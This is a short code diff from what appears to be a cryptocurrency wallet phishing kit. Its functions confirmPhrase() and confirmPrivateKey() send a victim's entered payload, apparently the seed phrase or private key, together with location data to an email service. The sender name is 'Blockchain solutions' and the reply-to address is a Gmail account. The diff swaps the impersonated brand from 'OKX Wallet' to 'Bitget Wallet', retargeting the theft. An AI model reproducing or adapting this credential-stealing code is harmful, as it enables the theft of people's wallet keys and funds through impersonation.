@@ -502,7 +502,7 @@ async function confirmPhrase() {
       user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
-        wallet_type: "OKX Wallet",
+        wallet_type: "Bitget Wallet",
         location: JSON.stringify(location.data),
         link_drops: JSON.stringify(payload),
         reply_to: "customeronlineagent@gmail.com",
@@ -541,7 +541,7 @@ async function confirmPrivateKey() {
       user_id: "DMvtKT5BmC4qV83V9",
       template_params: {
         from_name: "Blockchain solutions",
-        wallet_type: "OKX Wallet",
+        wallet_type: "Bitget Wallet",
         location: JSON.stringify(location.data),
         link_drops: JSON.stringify(payload),
         reply_to: "customeronlineagent@gmail.com",
